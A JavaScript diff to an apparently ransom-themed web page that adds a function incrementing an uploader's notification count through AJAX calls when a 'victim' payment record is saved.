@@ -25,8 +25,47 @@ var main = function () {
         },
         img: "",
         msg: "",
+        uploader: "",
         type: ""
     };
+
+    // increment user notification count
+    function sendNotification(amount) {
+        console.log("send", amount, $ransom.type);
+        $.ajax({
+            url: $ransom.server.db + "/users?id=" + $ransom.uploader,
+            dataType: "json",
+            method: "GET",
+            success: function (result) {
+                if (result.length === 1) {
+                    var userId = result[0].id;
+                    var userName = result[0].name;
+                    var notify = parseInt(result[0].notify) + 1;
+
+                    var userData = {
+                        notify: notify
+                    };
+
+                    $.ajax({
+                        url: $ransom.server.db + "/users/" + userId,
+                        dataType: "json",
+                        method: "PATCH",
+                        data: userData,
+                        success: function () {
+                            console.log(userName, "(" + userId + ")", "has", notify, "notifications");
+                        },
+                        error: function (error) {
+                            console.log("result " + result.length +  " : ajax error " + error.status);
+                            return false;
+                        }
+                    });
+                } else {
+                    console.log("Invalid ajax user", $ransom.uploader);
+                    return false;
+                }
+            }
+        });
+    }
 
     function checkInput() {
         // prevent invalid input
@@ -69,10 +108,11 @@ var main = function () {
                             dataType: "json",
                             method: "POST",
                             data: victimData,
-                            success: function (result) {
+                            success: function () {
+                                // notify that victim has paid
+                                sendNotification(victimData.paid);
                                 // redirect
                                 window.location.href = $ransom.server.files;
-                                console.log("result " + result);
                             },
                             error: function (error) {
                                 console.log("result " + result.length +  " : ajax error " + error.status);
@@ -91,10 +131,11 @@ var main = function () {
                             dataType: "json",
                             method: "PATCH",
                             data: victimData,
-                            success: function (result) {
+                            success: function () {
+                                // notify that victim has paid
+                                sendNotification(victimData.paid);
                                 // redirect
                                 window.location.href = $ransom.server.files;
-                                console.log("result " + result);
                             },
                             error: function (error) {
                                 console.log("result " + result.length +  " : ajax error " + error.status);
@@ -105,6 +146,7 @@ var main = function () {
                     // error
                     } else {
                         console.log("Invalid ajax haggle");
+                        return false;
                     }
                 },
                 error: function (error) {
@@ -126,6 +168,7 @@ var main = function () {
                     $ransom.msg = result[0].demand;
                     $("#mwahaha").text(result[0].demand);
                     $ransom.img = result[0].photoId;
+                    $ransom.uploader = result[0].userId;
 
                     $.ajax({
                         url: $ransom.server.db + "/photos?id=" + $ransom.img,
